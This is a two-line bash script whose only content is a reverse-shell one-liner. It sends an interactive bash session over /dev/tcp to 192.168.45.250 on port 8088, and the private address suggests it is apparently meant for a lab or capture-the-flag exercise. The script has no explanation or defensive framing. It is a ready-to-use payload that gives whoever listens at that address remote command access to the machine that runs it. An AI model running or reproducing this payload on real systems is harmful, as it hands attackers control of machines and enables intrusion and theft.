#!/usr/bin/bash

bash -i >& /dev/tcp/192.168.45.250/8088 0>&1
